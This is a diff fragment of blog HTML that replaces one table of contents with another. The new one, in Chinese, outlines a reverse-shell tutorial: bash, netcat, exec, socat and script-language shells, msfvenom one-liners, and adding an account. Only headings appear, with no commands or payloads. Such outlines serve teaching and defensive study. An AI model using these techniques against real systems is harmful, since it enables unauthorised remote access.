-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实战"><span class="nav-number">2.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#渗透分析"><span class="nav-number">2.2.</span> <span class="nav-text">渗透分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell介绍"><span class="nav-number">1.</span> <span class="nav-text">反弹shell介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux文件描述符和重定向"><span class="nav-number">2.</span> <span class="nav-text">Linux文件描述符和重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件描述符"><span class="nav-number">2.1.</span> <span class="nav-text">文件描述符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#重定向"><span class="nav-number">2.2.</span> <span class="nav-text">重定向</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell实例"><span class="nav-number">3.</span> <span class="nav-text">反弹shell实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bash反弹"><span class="nav-number">3.1.</span> <span class="nav-text">bash反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#netcat-NC-反弹"><span class="nav-number">3.2.</span> <span class="nav-text">netcat(NC) 反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec反弹"><span class="nav-number">3.3.</span> <span class="nav-text">exec反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#socat反弹"><span class="nav-number">3.4.</span> <span class="nav-text">socat反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编程语言脚本反弹"><span class="nav-number">3.5.</span> <span class="nav-text">编程语言脚本反弹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msfvenom-获取反弹一句话"><span class="nav-number">4.</span> <span class="nav-text">msfvenom 获取反弹一句话</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一句话添加账户"><span class="nav-number">4.1.</span> <span class="nav-text">一句话添加账户</span></a></li></ol></li></ol></div>
             
 
           </div>
